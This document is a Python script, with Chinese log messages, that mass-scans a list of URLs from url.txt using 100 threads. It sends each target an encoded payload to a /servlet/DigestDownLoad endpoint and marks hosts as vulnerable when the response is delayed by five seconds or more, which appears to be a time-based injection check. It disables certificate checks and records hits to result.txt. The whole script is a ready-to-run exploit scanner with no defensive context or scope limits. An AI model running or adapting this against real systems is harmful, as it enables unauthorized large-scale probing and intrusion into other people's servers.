import requests
import threading
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
file_lock = threading.Lock()

def check_vulnerability(url):
    vuln_path = "/servlet/DigestDownLoad?type=original&id=FAAor8PAATTP2HJBPAATTPponI4yXkPAATTP2HJBPAATTPcV1fbP56PAATTP2HJFPAATTPPAATTP2HJFPAATTPkfU71SDv5nFnpafrEPAATTP3HJDPAATTP"
    full_url = urljoin(url, vuln_path)
    headers = {
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0",
        "Accept": "application/json,text/javascript,*/*;q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
    }
    
    try:
        start_time = time.time()
        response = requests.get(
            full_url,
            headers=headers,
            verify=False,
            allow_redirects=False,
            timeout=30
        )
        response_time = time.time() - start_time
        status_code = response.status_code
        if 300 <= status_code < 400:
            print(f"[INFO] {url} - 状态码 {status_code} (3xx重定向)，漏洞不存在")
            return False, url, status_code, response_time       
        elif status_code == 200 and response_time >= 5:
            result_line = f"漏洞存在 - URL: {full_url}, 状态码: {status_code}, 响应时间: {response_time:.2f}秒\n"
            
            with file_lock:
                with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(result_line)
            print(f"[VULNERABLE] {url} - 漏洞存在! 状态码: {status_code}, 响应时间: {response_time:.2f}秒")
            return True, url, status_code, response_time       
        else:
            print(f"[INFO] {url} - 状态码 {status_code}, 响应时间 {response_time:.2f}秒，漏洞不存在")
            return False, url, status_code, response_time         
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {e}")
        return False, url, None, None

def main():
    try:
        with open("url.txt", "r", encoding="utf-8") as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到url.txt文件")
        return
    except Exception as e:
        print(f"[ERROR] 读取url.txt文件失败: {e}")
        return
    
    if not urls:
        print("[INFO] url.txt文件中没有有效的URL")
        return
    
    print(f"[INFO] 共读取到 {len(urls)} 个URL，开始检测...")
    print("[INFO] 线程数: 100")
    with open("result.txt", "w", encoding="utf-8") as f:
        f.write("漏洞检测结果:\n\n")
    vulnerable_count = 0
    with ThreadPoolExecutor(max_workers=100) as executor:
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                is_vulnerable, _, _, _ = future.result()
                if is_vulnerable:
                    vulnerable_count += 1
            except Exception as e:
                print(f"[ERROR] 处理 {url} 时发生异常: {e}")
    
    print(f"\n[INFO] 检测完成! 共发现 {vulnerable_count} 个存在漏洞的URL")
    print(f"[INFO] 详情请查看 result.txt 文件")

if __name__ == "__main__":
    main()